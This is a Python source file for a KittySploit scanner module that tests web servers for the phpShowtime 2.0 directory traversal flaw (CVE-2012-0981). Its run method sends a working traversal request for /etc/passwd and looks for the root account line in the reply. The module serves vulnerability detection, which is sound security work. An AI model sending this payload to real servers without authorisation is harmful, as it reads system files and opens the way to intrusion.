#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in phpShowtime 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpShowtime 2.0 - Directory Traversal Detection',
        'description': 'A directory traversal vulnerability in phpShowtime 2.0 allows remote attackers to list arbitrary directories and image files via a .. (dot dot) in the r parameter to index.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2012', 'phpshowtime', 'edb', 'lfi', 'kybernetika', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/18435',
            'https://nvd.nist.gov/vuln/detail/CVE-2012-0981',
            'http://www.exploit-db.com/exploits/18435',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/72824',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2012-0981',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?r=i/../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="phpShowtime 2.0 - Directory Traversal detected",
                path='/index.php?r=i/../../../../../etc/passwd',
            )
            return True
        return False

